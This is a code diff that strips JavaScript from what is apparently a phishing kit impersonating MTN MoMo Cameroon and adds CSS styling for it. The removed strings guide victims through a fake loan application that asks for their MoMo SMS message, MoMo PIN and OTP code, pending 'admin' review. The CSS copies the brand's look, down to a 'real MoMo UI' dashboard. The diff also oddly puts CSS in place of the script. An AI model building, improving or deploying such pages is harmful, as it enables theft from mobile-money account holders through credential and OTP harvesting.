@@ -1,929 +1,647 @@
-// ============================================================
-// script.js – Cameroon Version with All Features (Bug‑Fixed)
-// ============================================================
-
-// ─── Language Translations (FULL) ───
-const translations = {
-  en: {
-    welcome: 'Welcome to MTN MoMo Cameroon',
-    tagline: 'Get loans easily through MTN MoMo Cameroon',
-    calculator: 'Loan Calculator',
-    amount: 'Amount',
-    term: 'Term',
-    monthly: 'Monthly Payment',
-    start: 'START APPLICATION',
-    footer: '© 2026 MTN MoMo Loans – Powered by MTN Cameroon',
-    back: 'Back',
-    loan_application: 'Loan Application',
-    step1_sub: 'Step 1 of 5',
-    step2_sub: 'Step 2 of 5',
-    step3_sub: 'Step 3 of 5',
-    step4_sub: 'Step 4 of 5',
-    step5_sub: 'Step 5 of 5',
-    loan_type: 'Loan Type',
-    loan_amount: 'Loan Amount (XAF)',
-    loan_term: 'Loan Term',
-    purpose: 'Purpose of Loan',
-    next: 'NEXT STEP',
-    first_name: 'First Name',
-    last_name: 'Last Name',
-    phone_label: 'Phone Number (Cameroon)',
-    phone_hint: '9 digits without +237 prefix (e.g., 670123456)',
-    employment: 'Employment Status',
-    annual_income: 'Annual Income (XAF)',
-    kin_name: 'Next of Kin Name',
-    kin_phone: 'Next of Kin Phone',
-    summary: 'Application Summary',
-    applicant: 'Applicant',
-    submit: 'SUBMIT APPLICATION',
-    processing: 'Processing Application...',
-    processing_sub: 'Please wait while we process your loan application',
-    awaiting: '⏳ Awaiting admin approval...',
-    verify_sms: 'Verify MoMo Message',
-    paste_sms: '📩 Paste the MoMo message content:',
-    sms_hint: 'This should include the OTP code or verification details sent to your MoMo number.',
-    sms_tip: '💡 Tip:',
-    sms_tip_text: 'Check your SMS inbox for the message from MTN MoMo Cameroon. Copy the entire message text.',
-    submit_sms: 'SUBMIT MOMO MESSAGE',
-    resend_sms: '🔄 Resend SMS',
-    verifying_sms: 'Verifying SMS Message...',
-    verifying_sms_sub: 'Your SMS message has been received. Please wait for admin verification...',
-    admin_reviewing: '⏳ Admin is reviewing your SMS...',
-    enter_pin: 'Enter MoMo PIN',
-    pin_label: 'Enter your MoMo PIN (5 digits):',
-    submit_pin: 'SUBMIT MOMO PIN',
-    verifying_pin: 'Verifying MoMo PIN...',
-    verifying_pin_sub: 'Your MoMo PIN has been received. Please wait for admin verification...',
-    admin_reviewing_pin: '⏳ Admin is reviewing your PIN...',
-    enter_otp: 'Enter OTP Code',
-    otp_sub: 'Enter the 4-digit OTP code sent to your phone via MTN MoMo Cameroon',
-    otp_label: 'OTP Code (4 digits):',
-    verify_otp: 'VERIFY & APPROVE LOAN',
-    resend_otp: '🔄 Resend OTP',
-    verifying_otp: 'Verifying OTP Code...',
-    verifying_otp_sub: 'Your OTP code has been received. Please wait for admin verification...',
-    admin_reviewing_otp: '⏳ Admin is verifying your OTP...',
-    app_id: 'Application ID:',
-    approved_title: 'Loan Approved!',
-    approved_sub: 'Your loan has been successfully approved.',
-    amount_receive: 'Amount to Receive',
-    important: 'Important Information',
-    important_text: 'The funds will be deposited directly to your MTN MoMo account within 5 minutes. Please ensure your phone number is correct.',
-    loan_details: 'Loan Details',
-    next_steps: 'Next Steps:',
-    next_steps_text: 'To start repaying, you can set up an automatic payment plan in your MTN MoMo account in the next 7 days.',
-    finish: 'FINISH',
-    personal: 'Personal Loan',
-    business: 'Business Loan',
-    home: 'Home Loan',
-    student: 'Student Loan',
-    m6: '6 Months',
-    m12: '12 Months',
-    m18: '18 Months',
-    m24: '24 Months',
-    m48: '48 Months',
-    employed: 'Employed',
-    self_employed: 'Self-employed',
-    unemployed: 'Unemployed',
-    retired: 'Retired'
-  },
-  fr: {
-    welcome: 'Bienvenue chez MTN MoMo Cameroun',
-    tagline: 'Obtenez des prêts facilement via MTN MoMo Cameroun',
-    calculator: 'Calculateur de prêt',
-    amount: 'Montant',
-    term: 'Durée',
-    monthly: 'Paiement mensuel',
-    start: 'COMMENCER',
-    footer: '© 2026 Prêts MTN MoMo – Propulsé par MTN Cameroun',
-    back: 'Retour',
-    loan_application: 'Demande de prêt',
-    step1_sub: 'Étape 1 sur 5',
-    step2_sub: 'Étape 2 sur 5',
-    step3_sub: 'Étape 3 sur 5',
-    step4_sub: 'Étape 4 sur 5',
-    step5_sub: 'Étape 5 sur 5',
-    loan_type: 'Type de prêt',
-    loan_amount: 'Montant du prêt (XAF)',
-    loan_term: 'Durée du prêt',
-    purpose: 'Objet du prêt',
-    next: 'ÉTAPE SUIVANTE',
-    first_name: 'Prénom',
-    last_name: 'Nom',
-    phone_label: 'Numéro de téléphone (Cameroun)',
-    phone_hint: '9 chiffres sans le préfixe +237 (ex : 670123456)',
-    employment: 'Statut d’emploi',
-    annual_income: 'Revenu annuel (XAF)',
-    kin_name: 'Nom du proche parent',
-    kin_phone: 'Téléphone du proche parent',
-    summary: 'Résumé de la demande',
-    applicant: 'Demandeur',
-    submit: 'SOUMETTRE LA DEMANDE',
-    processing: 'Traitement de la demande...',
-    processing_sub: 'Veuillez patienter pendant que nous traitons votre demande de prêt',
-    awaiting: '⏳ En attente de l’approbation de l’admin...',
-    verify_sms: 'Vérifier le message MoMo',
-    paste_sms: '📩 Collez le contenu du message MoMo :',
-    sms_hint: 'Cela doit inclure le code OTP ou les détails de vérification envoyés à votre numéro MoMo.',
-    sms_tip: '💡 Astuce :',
-    sms_tip_text: 'Vérifiez votre boîte de réception SMS pour le message de MTN MoMo Cameroun. Copiez tout le texte du message.',
-    submit_sms: 'SOUMETTRE LE MESSAGE MOMO',
-    resend_sms: '🔄 Renvoyer le SMS',
-    verifying_sms: 'Vérification du message SMS...',
-    verifying_sms_sub: 'Votre message SMS a été reçu. Veuillez attendre la vérification de l’admin...',
-    admin_reviewing: '⏳ L’admin examine votre SMS...',
-    enter_pin: 'Entrez le PIN MoMo',
-    pin_label: 'Entrez votre PIN MoMo (5 chiffres) :',
-    submit_pin: 'SOUMETTRE LE PIN MOMO',
-    verifying_pin: 'Vérification du PIN MoMo...',
-    verifying_pin_sub: 'Votre PIN MoMo a été reçu. Veuillez attendre la vérification de l’admin...',
-    admin_reviewing_pin: '⏳ L’admin examine votre PIN...',
-    enter_otp: 'Entrez le code OTP',
-    otp_sub: 'Entrez le code OTP à 4 chiffres envoyé à votre téléphone via MTN MoMo Cameroun',
-    otp_label: 'Code OTP (4 chiffres) :',
-    verify_otp: 'VÉRIFIER ET APPOUVER LE PRÊT',
-    resend_otp: '🔄 Renvoyer l’OTP',
-    verifying_otp: 'Vérification du code OTP...',
-    verifying_otp_sub: 'Votre code OTP a été reçu. Veuillez attendre la vérification de l’admin...',
-    admin_reviewing_otp: '⏳ L’admin vérifie votre OTP...',
-    app_id: 'ID de la demande :',
-    approved_title: 'Prêt approuvé !',
-    approved_sub: 'Votre prêt a été approuvé avec succès.',
-    amount_receive: 'Montant à recevoir',
-    important: 'Informations importantes',
-    important_text: 'Les fonds seront déposés directement sur votre compte MTN MoMo dans les 5 minutes. Assurez-vous que votre numéro de téléphone est correct.',
-    loan_details: 'Détails du prêt',
-    next_steps: 'Prochaines étapes :',
-    next_steps_text: 'Pour commencer à rembourser, vous pouvez configurer un plan de paiement automatique sur votre compte MTN MoMo dans les 7 prochains jours.',
-    finish: 'TERMINER',
-    personal: 'Prêt personnel',
-    business: 'Prêt commercial',
-    home: 'Prêt immobilier',
-    student: 'Prêt étudiant',
-    m6: '6 mois',
-    m12: '12 mois',
-    m18: '18 mois',
-    m24: '24 mois',
-    m48: '48 mois',
-    employed: 'Employé',
-    self_employed: 'Indépendant',
-    unemployed: 'Sans emploi',
-    retired: 'Retraité'
-  }
-};
-
-let currentLang = localStorage.getItem('mtn_lang') || 'en';
-
-function toggleLanguage() {
-  currentLang = currentLang === 'en' ? 'fr' : 'en';
-  localStorage.setItem('mtn_lang', currentLang);
-  applyLanguage();
+:root {
+    --mtn-dark: #003366;
+    --mtn-gold: #FFD700;
+    --mtn-light: #004080;
+    --grad: linear-gradient(to right, #003366, #004080);
+    --page-bg: #F5F5F5;
+    --white: #FFFFFF;
+    --text-dark: #1C2340;
+    --text-mid: #444;
+    --text-light: #888;
+    --border: #ddd;
+    --radius: 12px;
+    --radius-sm: 8px;
 }
 
-function applyLanguage() {
-  document.querySelectorAll('[data-i18n]').forEach(el => {
-    const key = el.getAttribute('data-i18n');
-    if (translations[currentLang][key]) {
-      el.textContent = translations[currentLang][key];
-    }
-  });
-  document.getElementById('langIcon').textContent = currentLang === 'en' ? '🌐 FR' : '🌐 EN';
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+    font-family: 'Inter', sans-serif;
+    background: var(--page-bg);
+    color: var(--text-dark);
+    min-height: 100vh;
 }
 
-// ─── State ───
-const S = {
-    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
-    firstName: '', lastName: '', phone: '',
-    employment: '', annualIncome: 0,
-    kinName: '', kinPhone: '',
-    applicationId: '',
-    rejectedStep: null
-};
+/* MTN MOMO LOGO */
+.mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+.mtn-logo-icon {
+    width: 45px; height: 45px;
+    background: var(--mtn-gold);
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 1.8rem; font-weight: 900;
+    color: var(--mtn-dark);
+    position: relative;
+}
+.mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
+.mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
+.mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }
 
-let currentPollTimeout = null;
-let otpResendTimer = null;
-let otpResendCountdown = 0;
-let pinBlockTimer = null;
-let smsCountdownInterval = null;
-let otpCountdownInterval = null;
+/* LANGUAGE TOGGLE */
+.lang-toggle {
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 0.9rem;
+    cursor: pointer;
+    font-weight: 600;
+    padding: 5px 10px;
+    border-radius: 6px;
+    transition: background 0.2s;
+}
+.lang-toggle:hover { background: rgba(255,255,255,0.2); }
 
-// ─── localStorage Helpers ───
-const STORAGE_KEYS = {
-    APPLICATION_ID: 'mtn_application_id',
-    APPLICATION_DATA: 'mtn_application_data',
-    REJECTION_INFO: 'mtn_rejection_info',
-    FORM_DRAFT: 'mtn_form_draft',
-    OTP_TIMER: 'mtn_otp_timer'
-};
-
-function saveToLocalStorage(key, data) {
-    try {
-        localStorage.setItem(key, JSON.stringify(data));
-        console.log(`💾 Saved to localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to save ${key}:`, error);
-    }
+/* PAGE SYSTEM */
+.page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
+.page.active { display: flex; flex-direction: column; }
+@keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
 }
 
-function getFromLocalStorage(key) {
-    try {
-        const data = localStorage.getItem(key);
-        return data ? JSON.parse(data) : null;
-    } catch (error) {
-        console.error(`❌ Failed to load ${key}:`, error);
-        return null;
-    }
+/* TOAST NOTIFICATIONS */
+.toast {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #333;
+    color: #fff;
+    padding: 12px 20px;
+    border-radius: 8px;
+    font-size: 0.9rem;
+    z-index: 9999;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+    animation: slideDown 0.3s ease;
+    max-width: 90%;
+    text-align: center;
+}
+.toast-success { background: #166534; }
+.toast-error { background: #c0392b; }
+.toast-info { background: #1e40af; }
+@keyframes slideDown {
+    from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+    to { opacity: 1; transform: translateX(-50%) translateY(0); }
 }
 
-function removeFromLocalStorage(key) {
-    try {
-        localStorage.removeItem(key);
-        console.log(`🗑️ Removed from localStorage: ${key}`);
-    } catch (error) {
-        console.error(`❌ Failed to remove ${key}:`, error);
-    }
+/* NAV */
+.navbar {
+    background: var(--mtn-dark);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 0 20px;
+    height: 54px;
+    position: relative;
+    flex-shrink: 0;
+}
+.nav-left {
+    position: absolute;
+    left: 20px;
+    color: rgba(255,255,255,0.6);
+    font-size: 0.84rem;
+    cursor: pointer;
+    text-decoration: none;
+    transition: color 0.2s;
+}
+.nav-left:hover { color: #fff; }
+.nav-right {
+    position: absolute;
+    right: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    cursor: pointer;
+    padding: 4px;
+}
+.hline {
+    width: 20px; height: 2px;
+    background: rgba(255,255,255,0.6);
+    border-radius: 1px;
 }
 
-function saveApplicationId(id) {
-    if (id) {
-        S.applicationId = id;
-        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, {
-            id: id,
-            timestamp: new Date().toISOString()
-        });
-    }
+/* BUTTONS */
+.btn-grad {
+    background: var(--grad);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    padding: 14px 20px;
+    font-size: 0.88rem;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+    cursor: pointer;
+    width: 100%;
+    font-family: 'Inter', sans-serif;
+    transition: opacity 0.2s;
+}
+.btn-grad:hover { opacity: 0.9; }
+.btn-grad:disabled { opacity: 0.5; cursor: not-allowed; }
+.btn-gray {
+    background: #e0e0e0;
+    color: #666;
+    border: none;
+    border-radius: 8px;
+    padding: 14px 20px;
+    font-size: 0.88rem;
+    font-weight: 600;
+    letter-spacing: 0.05em;
+    cursor: pointer;
+    flex: 1;
+    font-family: 'Inter', sans-serif;
+    transition: background 0.2s;
+}
+.btn-gray:hover { background: #d0d0d0; }
+
+/* FORM */
+.field { margin-bottom: 18px; }
+.field label {
+    display: block;
+    font-size: 0.82rem;
+    font-weight: 500;
+    color: var(--text-mid);
+    margin-bottom: 6px;
+}
+.field input, .field select, .field textarea {
+    width: 100%;
+    padding: 11px 14px;
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm);
+    font-family: 'Inter', sans-serif;
+    font-size: 0.9rem;
+    color: var(--text-dark);
+    background: #fff;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    appearance: none;
+    -webkit-appearance: none;
+}
+.field input:focus, .field select:focus, .field textarea:focus {
+    border-color: var(--mtn-gold);
+    box-shadow: 0 0 0 3px rgba(255,215,0,0.2);
+}
+.field textarea { resize: vertical; min-height: 90px; }
+.sel-wrap { position: relative; }
+.sel-wrap::after {
+    content: '▾';
+    position: absolute;
+    right: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: var(--text-light);
+    pointer-events: none;
+    font-size: 0.9rem;
+}
+.field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.phone-row { display: flex; }
+.ph-pre {
+    padding: 11px 12px;
+    background: #f5f5f5;
+    border: 1.5px solid var(--border);
+    border-right: none;
+    border-radius: var(--radius-sm) 0 0 var(--radius-sm);
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: #555;
+    white-space: nowrap;
+    display: flex;
+    align-items: center;
+}
+.phone-row input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; flex: 1; }
+.field-hint { font-size: 0.75rem; color: var(--text-light); margin-top: 5px; }
+
+/* STEP PROGRESS */
+.prog-row { display: flex; gap: 8px; margin: 10px 0 24px; }
+.prog-seg { flex: 1; height: 4px; border-radius: 2px; background: #e0e0e0; transition: background 0.3s; }
+.prog-seg.done { background: var(--mtn-gold); }
+.prog-seg.now  { background: var(--mtn-gold); }
+
+/* STEP BUTTONS */
+.step-btns { display: flex; gap: 12px; margin-top: 8px; }
+.step-btns .btn-grad { flex: 1; }
+
+/* FOOTER */
+.pg-footer {
+    margin-top: auto;
+    padding: 14px;
+    text-align: center;
+    font-size: 0.78rem;
+    color: var(--text-light);
+    background: #fff;
+    border-top: 1px solid #eee;
+    flex-shrink: 0;
 }
 
-function loadApplicationId() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-    if (saved && saved.id) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            S.applicationId = saved.id;
-            return saved.id;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
-        }
-    }
-    return null;
+/* LANDING */
+#page-landing { background: var(--page-bg); }
+.land-nav {
+    background: var(--mtn-dark);
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 24px;
+    height: 52px;
+    flex-shrink: 0;
+}
+.land-center { flex: 1; display: flex; align-items: center; justify-content: center; padding: 32px 16px; }
+.land-card {
+    width: 100%;
+    max-width: 520px;
+    background: #fff;
+    border-radius: var(--radius);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.1);
+    padding: 36px 32px;
+}
+.land-card h1 { font-size: 1.45rem; font-weight: 700; text-align: center; margin-bottom: 6px; }
+.land-tagline { text-align: center; font-size: 0.84rem; color: var(--text-light); margin-bottom: 28px; }
+.calc-box {
+    background: #fafafa;
+    border: 1px solid #eee;
+    border-radius: var(--radius-sm);
+    padding: 20px;
+    margin-bottom: 22px;
+}
+.calc-box h2 { font-size: 0.92rem; font-weight: 600; margin-bottom: 16px; }
+.calc-row2 { display: flex; justify-content: space-between; font-size: 0.81rem; color: var(--text-mid); margin-bottom: 6px; }
+.calc-row2 .cv { color: var(--mtn-gold); font-weight: 600; }
+input[type=range] {
+    width: 100%;
+    -webkit-appearance: none;
+    height: 5px;
+    border-radius: 3px;
+    outline: none;
+    cursor: pointer;
+    margin-bottom: 4px;
+    background: linear-gradient(to right, var(--mtn-gold) 0%, var(--mtn-gold) var(--pct,10%), #ddd var(--pct,10%), #ddd 100%);
+}
+input[type=range]::-webkit-slider-thumb {
+    -webkit-appearance: none;
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    background: var(--mtn-gold);
+    border: 3px solid #fff;
+    box-shadow: 0 2px 6px rgba(255,215,0,0.5);
+    cursor: pointer;
+}
+.range-ends { display: flex; justify-content: space-between; font-size: 0.72rem; color: var(--text-light); margin-bottom: 14px; }
+.monthly-box {
+    background: #fff;
+    border: 1px solid #eee;
+    border-radius: var(--radius-sm);
+    padding: 14px 16px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+.monthly-box .ml { font-size: 0.82rem; color: var(--text-light); }
+.monthly-box .ma { font-size: 1.5rem; font-weight: 700; color: var(--mtn-gold); }
+.land-footer {
+    background: var(--mtn-dark);
+    padding: 14px;
+    text-align: center;
+    font-size: 0.77rem;
+    color: rgba(255,255,255,0.45);
+    flex-shrink: 0;
 }
 
-function saveApplicationData() {
-    const dataToSave = { ...S, timestamp: new Date().toISOString() };
-    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, dataToSave);
+/* STEP PAGES */
+.step-center { flex: 1; display: flex; align-items: flex-start; justify-content: center; padding: 28px 16px; }
+.step-card {
+    width: 100%;
+    max-width: 480px;
+    background: #fff;
+    border-radius: var(--radius);
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    padding: 32px 28px;
+}
+.step-card h2 { font-size: 1.25rem; font-weight: 700; text-align: center; margin-bottom: 4px; }
+.step-sub { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 4px; }
+
+/* SUMMARY */
+.sum-box {
+    border: 1px solid #e0e0e0;
+    border-left: 4px solid var(--mtn-gold);
+    border-radius: var(--radius-sm);
+    padding: 16px 14px;
+    margin: 16px 0;
+    background: #fafffe;
+}
+.sum-box h3 { font-size: 0.88rem; font-weight: 600; margin-bottom: 12px; }
+.sum-row { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 7px 0; border-bottom: 1px solid #f0f0f0; }
+.sum-row:last-child { border-bottom: none; }
+.sum-row .sk { color: var(--text-light); }
+.sum-row .sv { font-weight: 500; }
+
+/* PROCESSING */
+#page-processing { background: linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); align-items: center; justify-content: center; }
+.proc-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
+.proc-icon {
+    width: 80px; height: 80px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid rgba(255,255,255,0.3);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 2rem;
+    margin: 0 auto 24px;
+    animation: pulse 2s ease infinite;
+}
+@keyframes pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(255,215,0,0.3); }
+    50% { box-shadow: 0 0 0 16px rgba(255,215,0,0); }
+}
+.proc-wrap h2 { font-size: 1.6rem; font-weight: 700; color: #fff; margin-bottom: 12px; }
+.proc-wrap p  { color: rgba(255,255,255,0.75); font-size: 0.88rem; line-height: 1.7; margin-bottom: 24px; }
+
+/* SMS PASTE PAGE */
+#page-sms-paste { background: #fff; }
+.momo-msg-box { margin-bottom: 12px; }
+.momo-msg-box textarea { width: 100%; padding: 12px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-size: 0.9rem; min-height: 120px; }
+.momo-msg-box .hint { font-size: 0.75rem; color: var(--text-light); margin-top: 4px; }
+
+/* COUNTDOWN & RESEND */
+.countdown-text {
+    font-size: 0.85rem;
+    color: #7a4500;
+    background: #fff8f0;
+    border: 1.5px solid #f5c28a;
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin-bottom: 10px;
+    text-align: center;
+}
+.btn-resend {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 10px 22px;
+    background: var(--grad);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    cursor: pointer;
+    font-family: 'Inter', sans-serif;
+    transition: opacity 0.2s;
+    width: 100%;
+    justify-content: center;
+    margin-top: 5px;
+}
+.btn-resend:hover { opacity: 0.88; }
+.btn-resend:disabled { opacity: 0.5; cursor: not-allowed; }
+
+/* PIN PAGE */
+#page-pin { background: #fff; }
+.pin-label { font-size: 0.82rem; color: var(--text-light); text-align: center; margin-bottom: 12px; }
+.pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; position: relative; align-items: center; }
+.pin-box {
+    width: 52px; height: 52px;
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm);
+    text-align: center;
+    font-family: 'Inter', sans-serif;
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--mtn-dark);
+    outline: none;
+    transition: border-color 0.2s;
+}
+.pin-box:focus { border-color: var(--mtn-gold); box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
+.pin-eye { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border: none; margin-left: 6px; }
+.pin-delete { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border: none; margin-left: 6px; padding: 0; transition: color 0.2s; }
+.pin-delete:hover { color: var(--mtn-gold); }
+.pin-attempts { text-align: center; font-size: 0.85rem; margin-bottom: 10px; }
+.pin-attempts.warning { color: #d91e1e; font-weight: 600; }
+.pin-attempts.blocked { color: #d91e1e; font-weight: 700; }
+.pin-attempts.available { color: #166534; font-weight: 600; }
+
+/* OTP PAGE */
+#page-otp { background: #fff; }
+.otp-section { margin-bottom: 24px; }
+.otp-section-title { font-size: 0.9rem; font-weight: 600; color: var(--mtn-dark); margin-bottom: 12px; }
+.otp-inputs { display: flex; gap: 8px; margin-bottom: 12px; width: 100%; }
+.otp-box {
+    flex: 1;
+    min-width: 0;
+    width: 0;
+    height: 52px;
+    border: 1.5px solid var(--border);
+    border-radius: var(--radius-sm);
+    text-align: center;
+    font-family: 'Inter', sans-serif;
+    font-size: 1.2rem;
+    font-weight: 700;
+    color: var(--mtn-dark);
+    outline: none;
+    transition: border-color 0.2s;
+}
+.otp-box:focus { border-color: var(--mtn-gold); box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
+.otp-delete { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border: none; margin-left: 6px; padding: 0; transition: color 0.2s; }
+.otp-delete:hover { color: var(--mtn-gold); }
+
+/* APPROVAL */
+#page-approval { background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height: 100vh; align-items: center; justify-content: center; padding: 32px 16px; }
+.appr-wrap { width: 100%; max-width: 520px; }
+.appr-top { background: #fff; border-radius: var(--radius) var(--radius) 0 0; padding: 28px 24px 0; text-align: center; }
+.check-circle {
+    width: 56px; height: 56px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, var(--mtn-gold), var(--mtn-light));
+    display: flex; align-items: center; justify-content: center;
+    margin: 0 auto 12px;
+    font-size: 1.3rem;
+    color: #fff;
+    box-shadow: 0 4px 16px rgba(255,215,0,0.5);
+}
+.appr-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 6px; }
+.appr-sub   { font-size: 0.82rem; color: var(--text-light); margin-bottom: 18px; }
+.appr-banner { background: var(--grad); padding: 16px; margin: 0 -24px; text-align: center; }
+.appr-banner .abl { font-size: 0.72rem; color: rgba(255,255,255,0.8); text-transform: uppercase; letter-spacing: 0.06em; }
+.appr-banner .aba { font-size: 2rem; font-weight: 700; color: #fff; }
+.comp-box { background: #FFFBEA; border: 1px solid #F5C842; padding: 14px 16px; }
+.comp-box .ch { display: flex; align-items: center; gap: 6px; font-size: 0.82rem; font-weight: 700; color: #a07000; margin-bottom: 6px; }
+.comp-box p { font-size: 0.78rem; color: #7a5500; line-height: 1.6; }
+.ld-card { background: #fff; padding: 20px 24px; }
+.ld-htitle { font-size: 0.82rem; font-weight: 600; color: var(--text-mid); margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
+.ld-row { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid #f5f5f5; }
+.ld-row:last-child { border-bottom: none; }
+.ld-icon { width: 34px; height: 34px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 0.85rem; flex-shrink: 0; }
+.ic-g { background: linear-gradient(135deg, #2ECC71, #27AE60); color: #fff; }
+.ic-b { background: linear-gradient(135deg, #3498DB, #2980B9); color: #fff; }
+.ic-p { background: linear-gradient(135deg, #9B59B6, #8E44AD); color: #fff; }
+.ld-lbl { font-size: 0.72rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.04em; }
+.ld-val { font-size: 0.9rem; font-weight: 600; }
+.nxt-steps { background: #fff; padding: 14px 24px; display: flex; align-items: flex-start; gap: 8px; border-top: 1px solid #f0f0f0; }
+.nxt-steps p { font-size: 0.79rem; color: var(--text-light); line-height: 1.5; }
+.rth-wrap { background: #fff; border-radius: 0 0 var(--radius) var(--radius); padding: 14px 24px 24px; }
+.rth-btn {
+    width: 100%;
+    padding: 13px;
+    background: var(--grad);
+    color: #fff;
+    border: none;
+    border-radius: 8px;
+    font-size: 0.88rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    cursor: pointer;
+    font-family: 'Inter', sans-serif;
 }
 
-function loadApplicationData() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 24 * 60 * 60 * 1000) {
-            const fieldsToRestore = [
-                'loanType', 'loanAmount', 'loanTerm', 'loanPurpose',
-                'firstName', 'lastName', 'phone',
-                'employment', 'annualIncome', 'kinName', 'kinPhone',
-                'applicationId', 'rejectedStep'
-            ];
-            fieldsToRestore.forEach(field => {
-                if (saved[field] !== undefined) S[field] = saved[field];
-            });
-            console.log('🔄 Restored application data');
-            return true;
-        } else {
-            removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
-        }
-    }
-    return false;
+/* DASHBOARD (REAL MOMO UI) */
+#page-dashboard {
+    background: #f2f2f2;
+    min-height: 100vh;
+    padding: 0;
 }
-
-function saveRejectionInfo(step, applicationId) {
-    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, {
-        step, applicationId, timestamp: new Date().toISOString()
-    });
+.momo-dash {
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+    background: #f2f2f2;
 }
-
-function loadRejectionInfo() {
-    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-    if (saved) {
-        const age = Date.now() - new Date(saved.timestamp).getTime();
-        if (age < 5 * 60 * 1000) return saved;
-        else removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
-    }
-    return null;
+.momo-dash-header {
+    background: #ffcb05;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 20px;
 }
-
-function clearRejectionInfo() {
-    removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
+.momo-logo { display: flex; align-items: center; gap: 8px; }
+.momo-icon {
+    background: #004f9f;
+    color: #ffcb05;
+    font-weight: 900;
+    font-size: 1.3rem;
+    width: 32px;
+    height: 32px;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
 }
-
-function saveFormDraft() {
-    const draft = {
-        firstName: document.getElementById('s2fi')?.value || '',
-        lastName: document.getElementById('s2la')?.value || '',
-        phone: document.getElementById('s2ph')?.value || '',
-        loanAmount: document.getElementById('s1am')?.value || '',
-        loanPurpose: document.getElementById('s1pu')?.value || '',
-        employment: document.getElementById('s3em')?.value || '',
-        annualIncome: document.getElementById('s3in')?.value || '',
-        kinName: document.getElementById('s3kn')?.value || '',
-        kinPhone: document.getElementById('s3kp')?.value || '',
-        timestamp: new Date().toISOString()
-    };
-    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, draft);
+.momo-name { font-weight: 700; color: #004f9f; font-size: 1.1rem; }
+.momo-header-right { display: flex; gap: 12px; font-size: 1.3rem; }
+.momo-balance-card {
+    background: white;
+    margin: 16px;
+    border-radius: 16px;
+    padding: 24px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
 }
-
